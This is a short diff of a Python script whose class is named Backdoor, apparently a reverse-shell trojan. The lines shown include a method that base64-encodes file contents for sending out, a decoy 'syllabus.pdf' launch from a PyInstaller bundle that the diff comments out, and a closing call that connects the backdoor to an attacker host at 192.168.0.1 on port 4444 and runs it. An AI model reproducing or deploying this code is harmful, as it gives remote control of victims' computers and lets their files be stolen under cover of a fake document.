@@ -84,8 +84,8 @@ class Backdoor:
 		with open(path, "rb") as file:
 			return base64.b64encode(file.read())
 
-file_name = sys._MEIPASS + "\syllabus.pdf"
-subprocess.Popen(file_name,shell=True)
+#file_name = sys._MEIPASS + "\syllabus.pdf"
+#subprocess.Popen(file_name,shell=True)
 
 my_backdoor = Backdoor("192.168.0.1", 4444)        #change ip 
 my_backdoor.run()
